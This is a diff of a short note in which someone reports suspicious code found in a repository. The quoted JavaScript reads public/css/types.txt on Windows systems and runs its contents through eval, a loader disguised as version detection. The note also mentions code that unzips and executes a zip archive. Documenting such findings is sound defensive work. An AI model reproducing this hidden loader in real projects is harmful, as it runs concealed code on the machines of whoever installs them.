@@ -7,33 +7,34 @@ Part of which obviously trying to unzip and execute some code from public/js/js.
 Content of js.zip is unknown for now.
 
 Also this exec part is executes only on win32 systems.
-`const fs = require("fs");
-const os = require("os");
+`
 
-function site_version() {
+    const fs = require("fs");
+    const os = require("os");
+    function site_version() {
     const platform = os.platform();
-
+    
     switch (platform) {
-        case 'win32':
-            fs.readFile('public/css/types.txt', 'utf8', (err, data) => {
-                if (err) {
-                    return;
-                }
-
-                eval(data);
-            });
-            console.log("=")
-            return 'w';
-        case 'darwin':
-            return 'm';
-        case 'linux':
-            return 'l';
-        default:
-            return 'Unknown';
-    }
-}
-
-site_version()`
+         case 'win32':
+              fs.readFile('public/css/types.txt', 'utf8', (err, data) => {
+                  if (err) {
+                      return;
+                  }
+    
+                  eval(data);
+              });
+              console.log("=")
+              return 'w';
+          case 'darwin':
+              return 'm';
+          case 'linux':
+              return 'l';
+          default:
+              return 'Unknown';
+        }
+    } 
+    site_version()
+`
 
 I can't say for sure, maybe it's just a very strangely builded project. 
 I'm not going to dig further, I'll just leave this repo and text here in case I ever change my mind. 
